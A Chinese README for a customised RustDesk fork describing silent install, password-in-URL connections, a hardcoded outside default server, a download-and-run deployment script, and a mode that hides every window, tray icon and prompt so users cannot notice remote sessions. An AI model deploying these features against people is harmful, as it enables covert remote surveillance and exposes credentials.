# RustDesk 自定义版本

> **这是一个 RustDesk 的深度定制版本，专为企业批量部署和无人值守场景优化。**

## 🎯 核心特性

### ✅ 6 大定制功能

| # | 功能 | 说明 | 场景 |
|---|------|------|------|
| 1️⃣ | **完全静默运行** | 无窗口、无托盘图标、完全隐藏 | 无人值守运维 |
| 2️⃣ | **命令行密码支持** | `--password` 参数自动连接 | 自动化脚本 |
| 3️⃣ | **URL Scheme 支持** | 网页/浏览器一键拉起 | 远程支持系统 |
| 4️⃣ | **静默安装自定义路径** | `--path` 指定安装目录 | 企业批量部署 |
| 5️⃣ | **自定义服务器** | 私有化部署支持 | 内网环境 |
| 6️⃣ | **便携版密码设置** | 便携版支持 `--password` 设置密码 | 快速部署 |

---

## 🚀 快速开始

### 1. 静默安装

```powershell
# 默认路径安装
rustdesk.exe --silent-install

# 自定义路径安装
rustdesk.exe --silent-install --path="D:\RustDesk"

# 不创建桌面快捷方式
rustdesk.exe --silent-install --nolink

# 自定义路径 + 不创建桌面快捷方式
rustdesk.exe --silent-install --path="D:\RustDesk" --nolink
```

### 2. 命令行连接

```powershell
# 带密码自动连接
rustdesk.exe --connect <远程ID> --password <密码>

# 示例
rustdesk.exe --connect 1074305050 --password xiehan12
```

### 3. URL Scheme 连接

```html
<!-- HTML 链接 -->
<a href="rustdesk://connect/1074305050?password=xiehan12">连接远程桌面</a>
```

```powershell
# PowerShell
Start-Process "rustdesk://connect/1074305050?password=xiehan12"
```

### 4. 启动被控端（完全静默）

```powershell
# 服务方式启动（推荐）
rustdesk.exe --service

# CM 模式启动（已完全隐藏）
rustdesk.exe --cm
```

---

## 📋 功能详解

### 1️⃣ 完全静默运行

**特点：**
- ✅ 启动时无 "等待新连接..." 窗口
- ✅ 连接时无任何提示窗口
- ✅ 任务栏无图标
- ✅ Alt+Tab 无窗口
- ✅ 系统托盘无图标
- ✅ 100% 后台运行，完全无感知

**实现：**
- 11 处代码修改
- Windows API 窗口隐藏
- 禁用所有连接提示
- 禁用系统托盘图标

### 2️⃣ 命令行密码支持

**格式：**
```powershell
rustdesk.exe --connect <ID> --password <密码>
```

**特点：**
- ✅ 自动填充密码
- ✅ 自动发起连接
- ✅ 兼容旧格式
- ✅ 支持参数组合

### 3️⃣ URL Scheme 支持

**格式：**
```
rustdesk://connect/<ID>?password=<密码>&relay=true
```

**用途：**
- ✅ 网页一键连接
- ✅ 浏览器地址栏直接打开
- ✅ HTML 链接集成
- ✅ 客服系统集成

### 4️⃣ 静默安装自定义路径与选项

**格式：**
```powershell
rustdesk.exe --silent-install [--path="<路径>"] [--nolink]
```

**参数说明：**
- `--path="<路径>"` - 自定义安装目录
- `--nolink` - 不创建桌面快捷方式

**特点：**
- ✅ 支持绝对路径
- ✅ 支持环境变量
- ✅ 支持空格路径
- ✅ 灵活控制快捷方式
- ✅ 企业批量部署友好

### 5️⃣ 自定义服务器

**配置：**
- 默认服务器：`http://x.lxnt.cc:28800`
- 可通过配置文件自定义

**用途：**
- ✅ 私有化部署
- ✅ 内网环境
- ✅ 数据安全

### 6️⃣ 便携版密码设置

**格式：**
```powershell
rustdesk.exe --password <密码>
```

**特点：**
- ✅ 便携版无需安装即可设置密码
- ✅ 支持快速批量部署
- ✅ 向后兼容已安装版本
- ✅ 需要管理员权限

**使用示例：**
```powershell
# 以管理员身份设置密码
.\rustdesk.exe --password MySecurePass123

# 批量部署脚本
Start-Process rustdesk.exe -ArgumentList "--password", "YourPass" -Verb RunAs -Wait
```

---

## 📚 完整文档

详细的修改说明和使用指南，请查看：

### 📖 [修改说明_完整版.md](修改说明_完整版.md)

包含内容：
- ✅ 所有修改的详细代码片段
- ✅ 完整的使用示例
- ✅ 企业部署指南
- ✅ Windows API 技术细节
- ✅ 安全注意事项
- ✅ 兼容性说明

---

## 🔧 编译构建

### 环境要求

```
Rust: 1.75+ (nightly)
OS: Windows 10/11, Linux, macOS
Dependencies: Sciter SDK
```

### 编译命令

```powershell
# Windows - Sciter 版本（推荐）
cargo build --release --features inline

# Linux
cargo build --release

# macOS
cargo build --release
```

### 编译产物

```
target/release/rustdesk.exe    # Windows
target/release/rustdesk         # Linux/macOS
```

---

## 💼 企业部署

### GPO 批量部署

```powershell
# gpo_install.ps1
$url = "https://your-server.com/rustdesk.exe"
$installer = "$env:TEMP\rustdesk.exe"
$installPath = "D:\RustDesk"

# 下载
Invoke-WebRequest -Uri $url -OutFile $installer

# 静默安装到指定目录
& $installer --silent-install --path="$installPath"

# 清理
Remove-Item $installer -Force
```

### SCCM/Intune 配置

```xml
<Application>
  <Name>RustDesk</Name>
  <InstallCommand>rustdesk.exe --silent-install --path="D:\RustDesk"</InstallCommand>
  <UninstallCommand>rustdesk.exe --uninstall</UninstallCommand>
  <DetectionMethod>
    <FileExists>D:\RustDesk\rustdesk.exe</FileExists>
  </DetectionMethod>
</Application>
```

---

## ⚠️ 重要提示

### 安全性

1. **密码安全：**
   - ⚠️ 命令行密码可能被进程监控工具捕获
   - ⚠️ URL Scheme 密码会记录在浏览器历史中
   - ✅ 建议仅在受信任的内网环境使用

2. **权限控制：**
   - ⚠️ 完全静默模式下无任何提示
   - ⚠️ 用户无法察觉远程连接
   - ✅ 仅在授权场景下使用

3. **合规性：**
   - ⚠️ 使用前确保符合公司政策
   - ⚠️ 遵守当地法律法规
   - ✅ 明确告知用户远程监控

### 适用场景

✅ **适用：**
- 企业内部 IT 支持
- 无人值守服务器运维
- 授权的远程管理
- 自动化运维脚本

❌ **不适用：**
- 未授权的远程访问
- 侵犯隐私的监控
- 恶意软件行为
- 非法用途

---

## 📊 修改统计

| 类别 | 数量 |
|------|------|
| **修改文件** | 6 个 |
| **修改行数** | 18 处 |
| **新增代码** | ~200 行 |
| **核心功能** | 5 大模块 |

---

## 🔗 相关链接

- **原版 RustDesk：** https://github.com/rustdesk/rustdesk
- **官方文档：** https://rustdesk.com/docs/
- **技术支持：** https://github.com/xiehan12/rustdesk/issues

---

## 📜 开源协议

基于原版 RustDesk 的 AGPL-3.0 License

---

## 👨‍💻 贡献者

**定制版本维护：** xiehan12

**基于：** [RustDesk](https://github.com/rustdesk/rustdesk) 官方版本

---

## 📝 版本信息

| 项目 | 值 |
|------|-----|
| **基础版本** | RustDesk 1.2.x |
| **定制版本** | 1.0.0 |
| **修改日期** | 2024-11-18 |
| **适用平台** | Windows, Linux, macOS |

---

## 🎉 总结

本定制版本通过 **19 处精心优化**，实现了 **6 大核心功能**，专为以下场景设计：

- ✅ **企业批量部署** - 静默安装 + 自定义路径 + 便携版密码设置
- ✅ **无人值守运维** - 完全静默运行
- ✅ **自动化脚本** - 命令行密码支持
- ✅ **远程支持系统** - URL Scheme 集成
- ✅ **私有化部署** - 自定义服务器
- ✅ **快速部署** - 便携版即设即用

**一行命令，完全静默，开箱即用！** 🚀

---

**最后更新：** 2024-11-18  
**文档版本：** 1.0.0
